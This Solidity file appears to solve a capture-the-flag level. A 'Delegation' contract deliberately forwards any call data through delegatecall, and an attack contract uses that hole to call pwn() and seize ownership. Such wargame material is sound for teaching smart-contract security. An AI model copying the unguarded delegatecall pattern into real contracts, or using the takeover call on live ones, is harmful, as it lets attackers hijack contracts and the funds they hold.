pragma solidity ^0.4.24;

contract Delegate {

  address public owner;

  function Delegate(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  function Delegation(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  function() public {
    if(delegate.delegatecall(msg.data)) {
      this;
    }
  }
}

contract DelegationAttack {


    Delegation victim;

    constructor(address _victim) public {
        victim = Delegation(_victim);
    }

    //victim is vulnerable because the fallback function allows calling the
    // Delegate contract pwn function
    function attack() external returns(bool success) {
        if (address(victim).call(bytes4(keccak256('pwn()')))) {
            return success;
        }
    }
}
